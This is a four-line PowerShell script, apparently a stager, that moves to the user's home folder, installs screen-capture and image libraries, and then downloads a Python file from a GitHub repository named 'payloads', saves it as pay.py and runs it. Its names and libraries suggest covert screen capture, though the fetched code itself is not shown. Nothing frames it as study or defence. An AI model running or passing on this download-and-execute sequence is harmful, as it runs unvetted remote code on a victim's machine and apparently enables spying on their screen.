cd $env:USERPROFILE
pip install mss opencv-python numpy
iwr "https://raw.githubusercontent.com/lubrj/payloads/refs/heads/main/look.py" -OutFile "pay.py"
python pay.py
